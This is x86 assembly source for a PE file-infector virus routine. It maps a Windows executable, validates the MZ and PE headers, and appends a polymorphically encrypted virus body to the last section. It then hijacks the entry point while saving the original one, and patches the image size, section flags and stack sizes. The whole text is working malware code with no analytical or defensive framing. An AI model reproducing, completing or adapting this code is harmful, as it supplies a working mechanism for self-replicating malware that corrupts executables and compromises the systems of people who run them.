
; ---------------------------------------------------------------------------

infect_file:            pusha

                        call    get_base_ebp

                        lea     esi, infect_fileinfo[ebp] ; open & map file
                        call    fopenEx
                        jc      __exit

                        mov     esi, infect_fileinfo.fi_mapoffset[ebp]  ; esi = @mz

                        cmp     [esi].mz_id, 'ZM'   ; check if mz file
                        jne     __close
                        cmp     [esi].mz_relofs, mz_neptr
                        jb      __close

                        add     esi, [esi].mz_neptr ; esi = @pe

                        cmp     [esi].pe_id, 'EP'   ; check if pe file
                        jne     __close

                        ; eax = offset objtable = @pe + 18h + ntheadersize
                        movzx   eax, [esi].pe_ntheadersize
                        lea     eax, [eax + esi + pe_ntheader_id]

                        ; ebx = (#ofsections - 1) * 28h
                        movzx   ebx, [esi].pe_objectnum ; ebx = lastobjentry
                        dec     ebx
                        imul    ebx, size oe_struc

                        add     ebx, eax        ; ebx = offset last entry

                        ; edi = file size
                        mov     edi, [ebx].oe_phys_offs
                        add     edi, [ebx].oe_phys_size

                        ; if file has overlay then exit
                        cmp     edi, infect_fileinfo.fi_fd.fd_size[ebp]
                        jne     __close

                        mov     eax, edi
                        add     eax, [esi].pe_imagebase
                        mov     pgp_base[ebp], eax  ; poly decr base va

                        ; edi = virus offs in file (in memory)
                        add     edi, infect_fileinfo.fi_mapoffset[ebp]

                        mov     eax, [ebx].oe_virt_rva
                        add     eax, [ebx].oe_phys_size
                        add     eax, virmemory
                        add     eax, [esi].pe_imagebase
                        mov     pgp_data_va[ebp], eax

                        mov     eax, [esi].pe_entrypointrva  ; eax <--> eip
                        add     eax, [esi].pe_imagebase
                        mov     pe_retaddr[ebp], eax ; save old eip

                        ;;

                        call    create_decryptor

                        ;;

                        mov     eax, [ebx].oe_virt_rva  ; eax = new entrypoint
                        add     eax, [ebx].oe_phys_size
                        add     eax, pgp_buf_eip[ebp]
                        mov     [esi].pe_entrypointrva, eax

                        ; ecx = filealign-ed virus size
                        mov     edx, pgp_buf_size[ebp]
                        mov     eax, [esi].pe_filealign
                        dec     eax
                        add     edx, eax
                        not     eax
                        and     edx, eax

                        pusha

                        lea     esi, pgp_buf[ebp]    ; copy virus to file
                        mov     ecx, pgp_buf_size[ebp]
                        cld
                        rep     movsb

                        mov     ecx, edx                ; zero alignment
                        sub     ecx, pgp_buf_size[ebp]
                        xor     al, al
                        rep     stosb

                        popa

                        ; edi = objectalign-ed virus memory
                        mov     edi, virmemory * 2          ; 2 times!
                        mov     eax, [esi].pe_objectalign
                        dec     eax
                        add     edi, eax
                        not     eax
                        and     edi, eax

                        ; fix pe header

                        or      [esi].pe_flags, 1       ; relocs stripped
                        add     [esi].pe_imagesize, edi

                        mov     eax, 65536
                        add     [esi].pe_stackreserve, eax
                        add     [esi].pe_stackcommit,  eax

                        ; fix objtable entry

                        or      [ebx].oe_flags, 80000000h ; writeable

                        add     [ebx].oe_phys_size, edx

                        add     [ebx].oe_virt_size, edi

                        mov     eax, [ebx].oe_phys_size
                        cmp     eax, [ebx].oe_virt_size
                        jbe     __skip
                        mov     [ebx].oe_virt_size, eax
__skip:

                        ; fix file size

                        add     infect_fileinfo.fi_fd.fd_size[ebp], edx

                        ; done

__close:
                        lea     esi, infect_fileinfo[ebp]   ; close file & mapping
                        call    fcloseEx

__exit:
                        popa
                        ret

; ---------------------------------------------------------------------------
